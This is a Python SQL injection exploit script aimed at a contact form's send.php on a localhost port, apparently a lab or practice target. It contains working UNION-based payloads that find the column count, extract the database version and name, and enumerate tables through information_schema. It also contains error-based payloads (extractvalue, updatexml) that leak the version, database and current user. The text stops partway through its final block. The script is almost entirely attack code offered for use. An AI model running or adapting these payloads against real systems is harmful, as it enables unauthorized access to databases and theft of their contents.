import requests
import re

TARGET_URL = "http://127.0.0.1:32975/send.php"

BASE_DATA = {
    'fullname': '',
    'email': 'test@test.com',
    'phone': '123',
    'subject': 'Test',
    'message': 'Test',
    'submit': 'Send Message'
}

def send_payload(payload):
    data = BASE_DATA.copy()
    data['fullname'] = payload
    response = requests.post(TARGET_URL, data=data, timeout=30, allow_redirects=True)
    return response

def extract_from_response(response_text):
    """Extract data from response - look for injected data in output"""
    # Check if we got a normal page (successful injection)
    if len(response_text) > 10000:
        return "SUCCESS (normal page returned)"
    
    # Check for SQL errors (reveals info)
    error_match = re.search(r'uncaught mysqli_sql_exception:(.*?)</b>', response_text, re.IGNORECASE | re.DOTALL)
    if error_match:
        error_clean = re.sub(r'<[^>]+>', ' ', error_match.group(1))
        return f"ERROR: {error_clean[:200]}"
    
    # Check response if different
    return f"Response: {len(response_text)}B"

print("=" * 70)
print("SQL INJECTION EXPLOITATION - send.php")
print("Target: UNION-based extraction (6 columns)")
print("=" * 70)

# Test 1: Confirm 6 column UNION works
print("\n[1] CONFIRMING UNION COLUMN COUNT")
print("-" * 50)

test_payload = "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- -"
resp = send_payload(test_payload)
print(f"Payload: {test_payload}")
print(f"Result: {extract_from_response(resp.text)}")
print(f"Length: {len(resp.text)}B")

if len(resp.text) > 10000:
    print("[+] SUCCESS: 6-column UNION injection confirmed!")
else:
    print("[-] May need adjustment")

# Test 2: Extract version info
print("\n[2] EXTRACTING DATABASE VERSION")
print("-" * 50)

version_payload = "' UNION SELECT NULL,NULL,@@version,NULL,NULL,NULL -- -"
resp = send_payload(version_payload)
print(f"Payload: {version_payload}")

# Try different column positions for version
for col in range(1, 7):
    nulls = ['NULL'] * 6
    nulls[col-1] = "@@version"
    payload = f"' UNION SELECT {','.join(nulls)} -- -"
    resp = send_payload(payload)
    
    # Check if version shows in response
    version_match = re.search(r'(\d+\.\d+\.\d+[^\s<]*)', resp.text)
    if version_match and 'mariadb' in resp.text.lower() or 'mysql' in resp.text.lower():
        print(f"  Column {col}: Found version! {version_match.group(1)}")
    else:
        # Check different pattern
        db_match = re.search(r'(\d+\.\d+\.\d+)', resp.text)
        if db_match:
            print(f"  Column {col}: Possible version: {db_match.group(1)}")

# Test 3: Extract database name
print("\n[3] EXTRACTING DATABASE NAME")
print("-" * 50)

db_payloads = [
    "' UNION SELECT database(),NULL,NULL,NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,database(),NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL,database(),NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,database(),NULL -- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,database() -- -",
]

for i, payload in enumerate(db_payloads, 1):
    resp = send_payload(payload)
    # Look for database name pattern (common names)
    db_patterns = ['contact', 'app', 'web', 'test', 'main', 'prod', 'dev']
    for pattern in db_patterns:
        if pattern in resp.text.lower():
            print(f"  Column {i}: Possible DB indicator: '{pattern}' found")
            break

# Test 4: Extract table names from information_schema
print("\n[4] ENUMERATING TABLES")
print("-" * 50)

table_payloads = [
    # Try to get first table name
    "' UNION SELECT NULL,NULL,table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -",
    "' UNION SELECT NULL,NULL,NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -",
    # Group concat all tables
    "' UNION SELECT NULL,NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- -",
]

for payload in table_payloads:
    resp = send_payload(payload)
    print(f"Payload: {payload[:80]}...")
    print(f"Length: {len(resp.text)}B")
    
    # Check for interesting patterns in response
    if len(resp.text) > 300 and len(resp.text) < 10000:
        # Error or limited output - print relevant part
        snippet = resp.text[100:400] if len(resp.text) > 400 else resp.text[:400]
        print(f"Response snippet: {snippet}")

# Test 5: Try error-based extraction if UNION not displaying
print("\n[5] ERROR-BASED EXTRACTION ATTEMPTS")
print("-" * 50)

error_payloads = [
    # Extract version via error
    "' AND extractvalue(1,concat(0x7e,@@version,0x7e)) -- -",
    "' AND updatexml(1,concat(0x7e,@@version,0x7e),1) -- -",
    # Extract database
    "' AND extractvalue(1,concat(0x7e,database(),0x7e)) -- -",
    # Extract user
    "' AND extractvalue(1,concat(0x7e,user(),0x7e)) -- -",
]

for payload in error_payloads:
    resp = send_payload(payload)
    print(f"\nPayload: {payload[:60]}...")
    
    # Extract actual error message
    error_match = re.search(r'XPATH syntax error: [\'"]([^\'"]+)[\'"]', resp.text)
    if error_match:
        print(f"[!] EXTRACTED: {error_match.group(1)}")
    else:
        # Check for any XML/XPATH errors
        xpath_match = re.search(r'syntax error.*?:\s*([^<]+)', resp.text)
        if xpath_match:
